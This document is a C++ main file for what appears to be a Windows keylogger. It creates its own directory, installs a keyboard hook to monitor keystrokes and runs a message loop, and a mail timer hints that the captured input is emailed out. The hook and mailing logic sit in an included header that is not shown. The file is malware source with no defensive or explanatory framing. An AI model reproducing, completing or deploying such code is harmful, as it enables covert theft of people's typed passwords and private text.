#include <iostream>
#include <windows.h>
#include "KeybHook.h"
using namespace std;
//main function, application starting point
int main ()
    {
        //message to be processed
        MSG Msg;
        //create our directory...
        IO::MkDir (IO::GetOurPath (true));
        //install keyboard hook and start monitoring
        InstalHook ();
        //this is main message loop. it receives messages, translates them
        //and dispatch them for further processing
        while (GetMessage (&Msg, NULL, 0, 0))
            {
                TranslateMessage(&Msg);
                DispatchMessage(&Msg);
            }
        //stop mail timer...
        MailTimer.Stop ();
        return 0;
    }

